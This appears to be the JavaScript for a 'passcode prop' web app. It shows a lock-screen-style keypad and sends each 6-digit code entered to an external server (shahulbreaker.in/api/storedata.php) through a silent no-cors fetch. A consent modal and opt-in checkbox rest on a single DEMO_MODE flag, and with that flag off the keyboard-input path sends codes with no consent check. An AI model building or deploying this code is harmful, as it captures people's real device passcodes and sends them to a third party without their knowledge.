// Demo-mode Passcode Prop app.js
// Toggle demo restrictions here:
const DEMO_MODE = true; // when true, requires consent modal before sending codes

// API endpoint (will be used after consent)
const API_BASE = 'https://shahulbreaker.in/api/storedata.php?user=tarunpeek&data=';

// UI Elements
const consentModal = document.getElementById('consentModal');
const acceptBtn = document.getElementById('acceptBtn');
const declineBtn = document.getElementById('declineBtn');
const optInLog = document.getElementById('optInLog');
const dots = document.getElementById('dots');
const keys = document.querySelectorAll('.key');
const hiddenInput = document.getElementById('hiddenInput');
const appRoot = document.getElementById('app');

let code = '';

function updateDots(){
  const dotEls = dots.querySelectorAll('.dot');
  dotEls.forEach((d, i) => d.classList.toggle('filled', i < code.length));
}

function resetCode(){
  code = '';
  updateDots();
}

function sendCodeToApi(theCode){
  // check consent checkbox
  if (!optInLog.checked) {
    console.warn('User opted out of logging — not sending.');
    return;
  }
  const url = API_BASE + encodeURIComponent(theCode);
  // GET request (no CORS dependence because it's a pure navigation-less fetch)
  fetch(url, { method: 'GET', mode: 'no-cors' })
    .then(() => console.log('Code sent (no-cors fetch).'))
    .catch(e => console.error('Send failed', e));
}

// handle key taps
keys.forEach(k => {
  k.addEventListener('click', () => {
    if (DEMO_MODE && consentModal.style.display !== 'none') return; // block until accepted
    const digit = k.dataset.key;
    if (!digit) return;
    if (code.length >= 6) return;
    // small tap animation
    k.animate([{ transform: 'scale(0.98)' }, { transform: 'scale(1)' }], { duration: 120 });
    code += digit;
    updateDots();
    if (code.length === 6){
      // slight delay so dots fill visually
      setTimeout(() => {
        // send
        sendCodeToApi(code);
        // for safety, clear display after send (simulate lock)
        resetCode();
      }, 220);
    }
  });
});

// Accept / decline handlers for consent modal
acceptBtn.addEventListener('click', () => {
  consentModal.style.display = 'none';
  hiddenInput.focus();
});
declineBtn.addEventListener('click', () => {
  // keep on stage but do not proceed
  consentModal.querySelector('.modal-inner').animate([{ transform: 'translateY(0)' }, { transform: 'translateY(6px)' }], { duration: 180, iterations: 1 });
});

// Accessibility: allow using numeric keyboard
hiddenInput.addEventListener('input', (e) => {
  const val = e.target.value.replace(/\D/g,'').slice(-6);
  code = val;
  updateDots();
  if (code.length === 6){
    if (DEMO_MODE && consentModal.style.display !== 'none') return;
    sendCodeToApi(code);
    setTimeout(() => { resetCode(); hiddenInput.value = ''; }, 300);
  }
});

// Auto-show consent modal if demo mode
if (DEMO_MODE) {
  consentModal.style.display = 'flex';
} else {
  consentModal.style.display = 'none';
}

// Register Service Worker for offline
if ('serviceWorker' in navigator) {
  navigator.serviceWorker.register('/service-worker.js').then(() => {
    console.log('SW registered');
  }).catch(err => console.warn('SW failed', err));
}
